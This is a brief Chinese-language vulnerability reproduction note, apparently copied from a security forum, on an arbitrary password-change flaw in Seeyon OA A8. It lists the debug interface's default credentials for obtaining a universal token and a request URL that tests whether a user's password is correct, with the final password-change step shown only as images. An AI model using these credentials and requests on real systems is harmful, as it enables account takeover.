# 致远OA A8 任意用户密码修改漏洞

> 原文：[https://www.zhihuifly.com/t/topic/3353](https://www.zhihuifly.com/t/topic/3353)

# 致远OA A8 任意用户密码修改漏洞

## 一、漏洞简介

## 二、漏洞影响

致远OA A8

## 三、复现过程

```
http://www.0-sec.org/seeyon/services/authorityService?wsdl 
```

通过调试接口的默认用户 userName:service-admin password:123456 获取万能Token之后可以修改任意用户密码。

![image](img/3c4cb507dc2d209da3b457e3bf29e721.png)

访问

```
http://www.0-sec.org/seeyon/getAjaxDataServlet?S=ajaxOrgManager&M=isOldPasswordCorrect&CL=true&RVT=XML&P_1_String=zw&P_2_String=wooyun 
```

返回false 说明zw密码不正确

![image](img/618a9932312f5e6da14e430733ebfb59.png)

修改密码

![image](img/0516b27f27178254367fe70199a03582.png)

![image](img/c0da305643844565a5022f5f8286c5ee.png)